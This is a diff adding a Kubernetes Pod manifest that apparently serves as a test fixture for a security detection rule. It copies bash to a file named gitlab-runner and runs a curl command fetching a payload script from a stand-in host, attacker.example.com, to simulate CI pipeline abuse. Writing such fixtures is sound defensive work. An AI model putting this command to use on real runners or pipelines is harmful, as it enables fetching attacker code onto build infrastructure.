@@ -1,0 +1,15 @@
+#command: gitlab-runner spawns curl (malicious pipeline abuse)
+#note: actor_process_name should be gitlab-runner for full rule match
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: gitlab-runner-spawns-suspicious-process
+spec:
+  restartPolicy: Never
+  containers:
+  - name: gitlab-runner-spawns-suspicious-process
+    image: angelrita/base-ubuntu:latest
+    #imagePullPolicy: Never
+    command: ['sh']
+    args: ["-c", "cp /bin/bash gitlab-runner; ./gitlab-runner -c 'curl http://attacker.example.com/payload.sh'; sleep infinity"]
